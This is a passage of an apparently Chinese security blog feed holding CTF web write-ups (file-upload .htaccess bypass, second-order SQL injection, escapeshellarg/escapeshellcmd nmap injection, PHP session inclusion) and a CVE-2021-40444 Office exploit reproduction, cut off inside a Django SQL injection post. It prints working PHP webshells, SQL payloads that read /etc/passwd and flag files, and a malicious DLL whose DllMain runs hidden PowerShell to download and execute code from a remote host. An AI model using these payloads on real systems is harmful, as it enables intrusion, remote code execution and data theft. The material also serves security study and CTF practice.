GUI中使用的光标和图标位图。</p><p>前两个#defines指定位图的高度和宽度（以像素为单位），比如以下xbm文件：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n122" mdtype="fences">#define test_width 16<br/>#define test_height 7<br/>static char test_bits[] = {<br/>0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,<br/>0x00, 0x60 };</pre><p>后续就是绕过<code>&lt;?</code>这种过滤，WP解释由于使用PHP7.2，所以<code>&lt;script&gt;</code>指定语言的方式不能使用，这个没看出来PHP的版本。采用UTF-16大端编码格式，用一张图表示,utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1063309-20190718173949769-1098882942.png"></p><p>所以利用如下脚本生成</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n126" mdtype="fences">#!/usr/bin/python3<br/><br/>SIZE_HEADER = b&#34;\n\n#define width 1337\n#define height 1337\n\n&#34;<br/><br/>def generate_php_file(filename, script):<br/>    phpfile = open(filename, &#39;wb&#39;) <br/><br/>    phpfile.write(script.encode(&#39;utf-16be&#39;))<br/>    phpfile.write(SIZE_HEADER)<br/><br/>    phpfile.close()<br/><br/>def generate_htacess():<br/>    htaccess = open(&#39;..htaccess&#39;, &#39;wb&#39;)<br/>    htaccess.write(SIZE_HEADER)<br/>    htaccess.write(b&#39;AddType application/x-httpd-php .php16\n&#39;)<br/>    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)<br/>    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)<br/>    htaccess.write(b&#39;php_value display_errors 1\n&#39;)<br/>    htaccess.close()<br/>        <br/>generate_htacess()<br/><br/>generate_php_file(&#34;webshell.php16&#34;, &#34;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&#34;)<br/>generate_php_file(&#34;scandir.php16&#34;, &#34;&lt;?php echo implode(&#39;\n&#39;, scandir($_GET[&#39;dir&#39;]));?&gt;&#34;)</pre><p>由于设置了diable，所以不能执行命令，如果需要考虑绕过的形式，可以利用蚁剑来直接执行。或者利用文件读取的shell。直接读取flag。</p><h2 id="2018网鼎杯Comment"><a href="#2018网鼎杯Comment" class="headerlink" title="2018网鼎杯Comment"></a>2018网鼎杯Comment</h2><p>打开页面是一个留言板，留言会显示需要登陆，已经给了一个账号，zhangwei，但是密码不对，既然给了一个账号那就爆破一下密码，发现常规密码都不对，再次看密码格式三个星号可能代表需要爆破这三位？</p><p>设置数字爆破到密码为zhangwei666。</p><p>发帖后发现可以查看详情并且再去留言，可能是二次注入？使用一个异常的发帖后，再去给这个帖子提交留言，发现不能显示，可能是有问题。</p><p>试了一圈发现不太行，可能是需要组合利用，那还需要源代码查看。扫描一下目录。</p><p>发现一堆git泄露，好家伙在这等我呢。</p><p>找到一个write_do.php文件。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n135" mdtype="fences">&lt;?php<br/>include &#34;mysql.php&#34;;<br/>session_start();<br/>if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){<br/>    header(&#34;Location: ./login.php&#34;);<br/>    die();<br/>}<br/>if(isset($_GET[&#39;do&#39;])){<br/>switch ($_GET[&#39;do&#39;])<br/>{<br/>case &#39;write&#39;:<br/>    $category = addslashes($_POST[&#39;category&#39;]);<br/>    $title = addslashes($_POST[&#39;title&#39;]);<br/>    $content = addslashes($_POST[&#39;content&#39;]);<br/>    $sql = &#34;insert into board<br/>            set category = &#39;$category&#39;,<br/>                title = &#39;$title&#39;,<br/>                content = &#39;$content&#39;&#34;;<br/>    $result = mysql_query($sql);<br/>    header(&#34;Location: ./index.php&#34;);<br/>    break;<br/>case &#39;comment&#39;:<br/>    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);<br/>    $sql = &#34;select category from board where id=&#39;$bo_id&#39;&#34;;<br/>    $result = mysql_query($sql);<br/>    $num = mysql_num_rows($result);<br/>    if($num&gt;0){<br/>    $category = mysql_fetch_array($result)[&#39;category&#39;];<br/>    $content = addslashes($_POST[&#39;content&#39;]);<br/>    $sql = &#34;insert into comment<br/>            set category = &#39;$category&#39;,<br/>                content = &#39;$content&#39;,<br/>                bo_id = &#39;$bo_id&#39;&#34;;<br/>    $result = mysql_query($sql);<br/>    }<br/>    header(&#34;Location: ./comment.php?id=$bo_id&#34;);<br/>    break;<br/>default:<br/>    header(&#34;Location: ./index.php&#34;);<br/>}<br/>}<br/>else{<br/>    header(&#34;Location: ./index.php&#34;);<br/>}<br/>?&gt;</pre><p>字段都是直接拼接，但是使用了addslashes转义字段。查找一下绕过的方式</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n137" mdtype="fences">1：字符编码问题导致绕过<br/>1.1、设置数据库字符为gbk导致宽字节注入<br/>1.2、使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入<br/><br/>2：编码解码导致的绕过<br/>2.1、url解码导致绕过addslashes<br/>2.2、base64解码导致绕过addslashes<br/>2.3、json编码导致绕过addslashes<br/><br/>3：一些特殊情况导致的绕过<br/>3.1、没有使用引号保护字符串，直接无视addslashes<br/>3.2、使用了stripslashes<br/>3.3、字符替换导致的绕过addslashes</pre><p>不过这个地方既没有编解码的函数也没有字符编码的设置，还使用了单引号闭合。理论上按照闭合那一套是不能注入的。但是现在有个问题是</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n139" mdtype="fences">$category = mysql_fetch_array($result)[&#39;category&#39;];</pre><p>如上获取数据的时候，没有使用转义函数，后续直接进行的拼接。addslashes函数转义保存到数据库的时候，反引号是不保存到数据库的，也就是<code>\&#39;</code>保存到数据库就变成了<code>’</code>单引号。</p><p>也就是需要我们在发帖的时候保存category字段一个注入的代码，在留言评论的时候来触发他。</p><p>先来构造一下SQL语句，既然是insert注入，那就用盲注，构造如下语句。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n143" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0),#&#39;,<br/>                content = &#39;$content&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre><p>先来发个帖子，咱来评论留言，发现SQL被执行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211009172411010.png" alt="image-20211009172411010"></p><p>既然user是r开头的，那估计也就是root@localhost了，查库表。本来写个脚本执行，但是发现总是请求过多，响应超时。</p><p>搞了半天总是报错，就看看能不能报错回显出来，本地测试一个报错回显的语句，这样写能成功，但是需要出单引号，上面的语句只能闭合不能出去。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n148" mdtype="fences">insert into users<br/>set id = 55,<br/>username = updatexml(1,concat(0x7e,(version())),0),<br/>password = &#39;11111&#39;;</pre><p>这是个多行的SQL语句，可以使用多行注释来拼接，然后再写一个参数进去，类似如下：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n150" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39;,/*&#39;,<br/>                content = &#39;*/ content=updatexml(1,concat(0x7e,(version())),0),#&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre><p>试了半天也没结果，然后才想起来这报错不会被写进去，直接报错去了。。。</p><p>既然能写进去，那就直接执行，不需要报错语句，测试以下语句。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n153" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39;,/*&#39;,<br/>                content = &#39;*/ content=version(),#&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre><p>回显如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015145908789.png" alt="image-20211015145908789"></p><p>想了一圈子发现还是最简单的方式能直接使用。查库名为ctf。如下查询表的时候注意要括号包裹不然会报错。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n157" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39;,/*&#39;,<br/>                content = &#39;*/ content=(select group_concat(table_name) from information_schema.tables where table_schema=database()),#&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015152847893.png" alt="image-20211015152847893"></p><p>查询字段名，主要表名要十六进制形式，查询user表。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n160" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x75736572),#&amp;bo_id=1</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015163102290.png" alt="image-20211015163102290"></p><p>查字段信息，就一个zhangwei。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n163" mdtype="fences">content=*/+content=(select+group_concat(username)+from+ctf.user),#&amp;bo_id=1</pre><p>换一个表查，board表。hex值为0x626f617264。字段有：id,category,title,content</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n165" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x626f617264),#&amp;bo_id=1</pre><p>这几个字段查了一遍还是没有信息，表comment也没有信息，这就有意思了。不在数据库里，SQL还能干啥，毕竟是root权限，试试能不能写文件。</p><p>试了一番发现并不能愉快的写文件，或者目录是特定目录。文件不给写试试能不能读。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n168" mdtype="fences">content=*/+content=(SELECT+LOAD_FILE(0x2f6574632f706173737764)),#&amp;bo_id=2</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015173416010.png" alt="image-20211015173416010"></p><p>好家伙 又是一个花式文件读取。直接读取根目录下的flag文件</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n171" mdtype="fences">content=11*/+content=(SELECT+LOAD_FILE(0x2f666c6167)),#&amp;bo_id=3</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018101945665.png" alt="image-20211018101945665"></p><h2 id="asis-2019-unicorn-shop"><a href="#asis-2019-unicorn-shop" class="headerlink" title="asis_2019_unicorn_shop"></a>asis_2019_unicorn_shop</h2><p>访问首页是一个购买网页，需要购买独角兽。但是我们没有钱，明显买不了。随便输入一个数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018104332545.png" alt="image-20211018104332545"></p><p>发现需要一个Unicode的编码参数，而且用了<code>unicodedata.numeric</code>来处理输入的值。意思是将Unicode转为等效的数值，那么可能就是Unicode编码转换中绕过数值购买判断。</p><p>其中最贵的是1337，那么需要找到一个转换后大于等于1337的Unicode码。</p><p>选择如下的符号：<a href="https://www.compart.com/en/unicode/U+10123">https://www.compart.com/en/unicode/U+10123</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018114617271.png" alt="image-20211018114617271"></p><p>不过这个flag应该是有问题的，并不能验证成功。</p><h2 id="buuctf-2018-online-tool"><a href="#buuctf-2018-online-tool" class="headerlink" title="buuctf_2018_online_tool"></a>buuctf_2018_online_tool</h2><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n182" mdtype="fences">&lt;?php<br/><br/>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {<br/>    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];<br/>}<br/><br/>if(!isset($_GET[&#39;host&#39;])) {<br/>    highlight_file(__FILE__);<br/>} else {<br/>    $host = $_GET[&#39;host&#39;];<br/>    $host = escapeshellarg($host);<br/>    $host = escapeshellcmd($host);<br/>    $sandbox = md5(&#34;glzjin&#34;. $_SERVER[&#39;REMOTE_ADDR&#39;]);<br/>    echo &#39;you are in sandbox &#39;.$sandbox;<br/>    @mkdir($sandbox);<br/>    chdir($sandbox);<br/>    echo system(&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;.$host);<br/>}</pre><p>打开首页，又是一段代码，其中涉及两个函数escapeshellarg和escapeshellcmd，这是个防止命令执行的函数，区别在于</p><p>escapeshellarg：转义其中的单引号，并用单引号来包裹字符串。保证输入为一个字符串。</p><p>escapeshellcmd：转义可能导致命令执行的特殊符号，常见的特殊符号包括换行符都被会转义，单双引号在不配对的时候也被转义。保证输入为避免利用shell的特性执行其他命令。</p><p>本身正常情况下，都能起到防止命令注入，但是如果在一起使用，就会导致异常转义，因为escapeshellcmd也转义反斜线。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n187" mdtype="fences">127.0.0.1&#39; id<br/>escapeshellarg: &#39;127.0.0.1&#39;\&#39;&#39; id&#39;<br/>escapeshellcmd: 127.0.0.1\&#39; id</pre><p>在一起使用就会变成</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n189" mdtype="fences">escapeshellarg+escapeshellcmd: &#39;127.0.0.1&#39;\\&#39;&#39; id\&#39;</pre><p>简化上面的输入就是，第一个单引号已经被转义，后面的单引号也是，所以此处只当作字符来处理。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n191" mdtype="fences">127.0.0.1\ id&#39;</pre><p>但以上的命令并不能被执行，问题在于利用shell特性的分割连接符等都被转义了。以上解决的只是把一个字符串的输入分割成了携带参数形式的输入。</p><p>后面需要利用nmap，既然是能分割成携带参数选项的输入，那需要配合nmap的参数来执行。记得在nmap的一个低版本存在一个提权问题，不过由于是交互界面。也不能使用shell的命令符号，需要查找一个nmap能执行使用的参数。</p><p>首页代码中使用IP创建一个sandbox的目录，按照惯性，应该是为了写文件而准备的，所以应该是利用nmap的输出属性来执行。nmap输出参数有<code>-oN/-oX/-oS/-oG/-oA</code>。</p><p>首先需要调试一个能正常逃逸出单引号的payload，可以在<a href="https://tool.lu/coderunner">https://tool.lu/coderunner</a>测试，首先需要逃逸出双引号的两端包裹，先在两端添加两个单引号，输出为：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n196" mdtype="fences">&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php&#39;\\&#39;&#39;&#39;<br/>简化为：\&lt;?php @eval($_POST[123]);?&gt; -o index.php\\</pre><p>再需要分割开两端的反斜线，两端添加两个空格。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n198" mdtype="fences">&#39; &lt;?php @eval($_POST[123]);?&gt; -o index.php &#39;<br/>输出为：&#39;&#39;\\&#39;&#39; \&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php &#39;\\&#39;&#39;&#39;</pre><p>于是大概能用的payload就出来了，先测试一下哪个参数可以使用，一个个试一下，发现oG可以使用。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018151828426.png" alt="image-20211018151828426"></p><p>最后剑来，在根目录下发现一个flag</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018151945869.png" alt="image-20211018151945869"></p><p>哎嘿，这个flag又报错，看来0Solves的多少有点问题。</p><h2 id="Bestphp"><a href="#Bestphp" class="headerlink" title="Bestphp"></a>Bestphp</h2><p>首页又是一段PHP</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n206" mdtype="fences">&lt;?php<br/>    highlight_file(__FILE__);<br/>    error_reporting(0);<br/>    ini_set(&#39;open_basedir&#39;, &#39;/var/www/html:/tmp&#39;);<br/>    $file = &#39;function.php&#39;;<br/>    $func = isset($_GET[&#39;function&#39;])?$_GET[&#39;function&#39;]:&#39;filters&#39;; <br/>    call_user_func($func,$_GET);<br/>    include($file);<br/>    session_start();<br/>    $_SESSION[&#39;name&#39;] = $_POST[&#39;name&#39;];<br/>    if($_SESSION[&#39;name&#39;]==&#39;admin&#39;){<br/>        header(&#39;location:admin.php&#39;);<br/>    }<br/>?&gt;</pre><p>由于存在call_user_func，所以我们可以覆盖file参数，来达到包含我们想要的文件，如果直接读取flag的话，下面的内容就有点多余，所以这里大概需要读取function和admin文件来查看。不能直接包含，不然PHP代码看不到。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n208" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=./function.php</pre><p>function内容为如下，看起来是个黑名单过滤。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n210" mdtype="fences">&lt;?php<br/>function filters($data){<br/>    foreach($data as $key=&gt;$value){<br/>        if(preg_match(&#39;/eval|assert|exec|passthru|glob|system|popen/i&#39;,$value)){<br/>            die(&#39;Do not hack me!&#39;);<br/>        }<br/>    }<br/>}<br/>?&gt;</pre><p>admin文件为</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n212" mdtype="fences">&lt;?php<br/>if(empty($_SESSION[&#39;name&#39;])){<br/>    session_start();<br/>    #echo &#39;hello &#39; + $_SESSION[&#39;name&#39;];<br/>}else{<br/>    die(&#39;you must login with admin&#39;);<br/>}<br/>Pz4</pre><p>看起来没有直接利用的函数，但是这个创建了session，也就是有session文件的写入，我们需要去读取session文件来包含。</p><p>session的name在首页的POST中传输，再去访问admin文件，这里只判断参数是不是空。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n215" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=/tmp/sess_k8ud00tfqs2mevh289uukn5to5</pre><p>加载发现，并没有回显，也许不在这个目录，在/var/lib下。</p><p>但是这里有一个问题，由于open_basedir的存在，我们不能加载别的目录下的文件，只能加载当前目录和tmp目录。</p><p>session_start函数有一个参数为save_path，可以设置保存路径，注意此处随便写入一个session的文件名，不然在POST获取的时候，就已经创建null。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n219" mdtype="fences">POST /?function=session_start&amp;save_path=/tmp HTTP/1.1<br/>Host: www.bmzclub.cn:22937<br/>DNT: 1<br/>Upgrade-Insecure-Requests: 1<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br/>Cookie: PHPSESSID=123<br/>Connection: close<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 23<br/><br/>name=&lt;?php phpinfo();?&gt;</pre><p>获取session</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n221" mdtype="fences">/?function=extract&amp;file=/tmp/sess_123</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018172443260.png" alt="image-20211018172443260"></p><p>写入一个shell</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n224" mdtype="fences">name=&lt;?php system($_GET[&#34;aaa&#34;]);?&gt;</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018172740231.png" alt="image-20211018172740231"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;端午就该吃粽子&quot;&gt;&lt;a href=&quot;#端午就该吃粽子&quot; class=&quot;headerlink&quot; title=&quot;端午就该吃粽子&quot;&gt;&lt;/a&gt;端午就该吃粽子&lt;/h2&gt;&lt;p&gt;访问login.php，会给一个这样的链接&lt;a href=&quot;http://www.bmzclub.c
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Office Word CVE-2021-40444 </title>
    <link href="https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/"/>
    <id>https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/</id>
    <published>2021-09-15T08:55:33.000Z</published>
    <updated>2021-09-15T08:55:33.305Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2021-40444"><a href="#CVE-2021-40444" class="headerlink" title="CVE-2021-40444"></a>CVE-2021-40444</h3><p>Office Word的一个1day，首先来复现一下使用，如果直接运行会显示CAB file建立时出错，需要先安装lacb。这里使用Tools老哥的一个方法，直接安装：</p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;l&#x2F;lcab&#x2F;lcab_1.0b12.orig.tar.gztar zxvf lcab_1.0b12.orig.tar.gzcd lcab-1.0b12.&#x2F;configuremakesudo make installwhich lcab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用项目地址：<a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p>利用文档中给出的方法执行：</p><pre class="line-numbers language-none"><code class="language-none">python3 exploit.py generate test&#x2F;calc.dll http:&#x2F;&#x2F;192.168.111.130:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915103820898.png" alt="image-20210915103820898"></p><p>然后监听</p><pre class="line-numbers language-none"><code class="language-none">python3 exploit.py host 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915103914999.png" alt="image-20210915103914999"></p><p>把在out文件夹下生成的document.docx拷贝到Windows下，此处的office2019，16.0.13929版本。运行docx文件，可以看到交互过程</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915104537994.png" alt="image-20210915104537994"></p><p>于是就可以弹出计算器<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915104258300.png" alt="image-20210915104258300"></p><p>从请求上看，有一个word.html文件，在srv目录下。打开查看,OK 看不懂。。。看样子是做了混淆？不过任然可以依稀看到ActiveXObject，这个大概跟利用ActiveX控件有关。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915105543173.png" alt="image-20210915105543173"></p><p>可以来<a href="http://jsnice.org/">美化一下</a>，虽然依旧看不懂就是。不过从中间大概可以看到几个关键点，XMLHttpRequest发起的请求，地址为<a href="http://192.168.111.130:5555/word.cab">http://192.168.111.130:5555/word.cab</a>。所以这个cab文件才是真正执行的文件？</p><p>利用7z打开这个cab文件，文件标头为<code>4D 53 43 46</code>，虽然这个文件只有224K，但是里面有一个名为msword.inf的文件，大小为1G左右。这不太对。这个文件也在上面的js中提到过，所以大概是需要解压出来，想办法提取一下这个文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915112956403.png" alt="image-20210915112956403"></p><p>该文件是Windows的压缩格式，一般是作为安装包文件。利用Kali下的<strong>cabextract</strong>来解压。没有的话直接安装就行。</p><pre class="line-numbers language-none"><code class="language-none">cabextract --list word.cab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行报错，这个文件不能正常解压提取，说明不是一个正经的cab文件。看一下python的处理代码</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915112956403.png" alt="image-20210915120544407"></p><p>可以发现其实msword.inf就是word.dll。这个dll文件就是一开始传入的calc.dll重命名来的。后面用lcab来生成cab文件，然后用函数patch_cab来处理这个cab文件。这么我们先把这个处理前生成的cab文件保存一下。</p><pre class="line-numbers language-none"><code class="language-none">execute_cmd(&#39;lcab out.cab out2.cab&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到out2.cab，这个文件可以正常解压查看，所以我们先尝试是否能自己生成一个cab文件，利用dll来转换。</p><p>用cobaltstrike生成一个DLL文件，按照转换方式来处理一下。先改个名字，此处用的beacon作为名字，那么word.html中也要做相应的修改。或者把名字改为msword。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915141049112.png" alt="image-20210915141049112"></p><p>然后需要patch一下，原项目中存在patch脚本，修改为类似如下：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python3​# Patch cab file​m_off &#x3D; 0x2df &#x3D; open(&#39;.&#x2F;beacon.cab&#39;,&#39;rb&#39;)cab_data &#x3D; f.read()f.close()​out_cab_data &#x3D; cab_data[:m_off]out_cab_data +&#x3D; b&#39;\x00\x5c\x41\x00&#39;out_cab_data +&#x3D; cab_data[m_off+4:]​out_cab_data &#x3D; out_cab_data.replace(b&#39;..\\beacon.inf&#39;, b&#39;..&#x2F;beacon.inf&#39;)​f &#x3D; open(&#39;.&#x2F;beacon2.cab&#39;,&#39;wb&#39;)f.write(out_cab_data)f.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是在执行过程中并没有上线，不确定原因，可能是DLL的问题？CS生成的DLL不能直接拿来用？</p><p>使用C代码编译生成一个DLL，利用如下代码，编译执行即可。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;windows.h&gt;​void exec(void) &#123;system(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.111.130:80&#x2F;a&#39;))\&quot;&quot;);return;&#125;​BOOL WINAPI DllMain(   HINSTANCE hinstDLL,   DWORD fdwReason,   LPVOID lpReserved )&#123;   switch( fdwReason )  &#123;       case DLL_PROCESS_ATTACH:          exec();          break;​       case DLL_THREAD_ATTACH:           break;​       case DLL_THREAD_DETACH:           break;​       case DLL_PROCESS_DETACH:           break;  &#125;   return TRUE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><pre class="line-numbers language-none"><code class="language-none">apt-get install gcc-mingw-w64i686-w64-mingw32-gcc -shared beacon.c -o beacon.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把文件放到test目录下，执行上面的命令。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915161830711.png" alt="image-20210915161830711"></p><p>减轻影响</p><p>这个是利用ActiveX控件来执行的，而这个控件只有IE支持，到IE的选项-安全中，自定义安全级别，在运行ActiveX控件和插件选项中选择禁用。</p><p>参考地址：</p><p><a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p><a href="https://www.t00ls.cc/thread-62682-1-1.html">https://www.t00ls.cc/thread-62682-1-1.html</a></p><p><a href="https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A">https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CVE-2021-40444&quot;&gt;&lt;a href=&quot;#CVE-2021-40444&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-40444&quot;&gt;&lt;/a&gt;CVE-2021-40444&lt;/h3&gt;&lt;p&gt;Office Word的一个1day，首先来
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-35042 Django SQL注入</title>
    <link href="https://misakikata.github.io/2021/08/CVE-2021-35042-Django-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://misakikata.github.io/2021/08/CVE-2021-35042-Django-SQL注入/</id>
    <published>2021-08-06T08:16:55.000Z</published>
    <updated>2021-08-06T08:19:06.431Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-35042-Django-SQL注入"><a href="#CVE-2021-35042-Django-SQL注入" class="headerlink" title="CVE-2021-35042 Django SQL注入"></a>CVE-2021-35042 Django SQL注入</h2><p>该漏洞是由于对QuerySet.order_by()中用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SQL注入攻击，最终造成服务器敏感信息泄露。</p><p>先本地创建一个Django环境，使用的版本为Django 3.1.10。具体的示例代码就使用：<a href="https://github.com/YouGina/CVE-2021-35042">https://github.com/YouGina/CVE-2021-35042</a>。</p><h3 id="Order-by参数获取"><a href="#Order-by参数获取" class="headerlink" title="Order_by参数获取"></a>Order_by参数获取</h3><p>其中获取GET参数值的是<code>request.GET.get(&#39;order_by&#39;, &#39;name&#39;)</code>这么一段，从order_by 中获取值，缺省为name。这个name的意思是数据库的字段。在models.py文件中有定义，也就是其实获取的是需要去查询的数据库字段名。</p><pre class="line-numbers language-none"><code class="language-none">class User(models.Model):    name &#x3D; models.CharField(max_length&#x3D;200)​    def __str__(self):        return self.name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order_by这个参数的作用的排序，对一个列或者多个值进行升序或者降序的排列。比如：</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM Websites ORDER BY alexa DESC;<span aria-hidden="true" 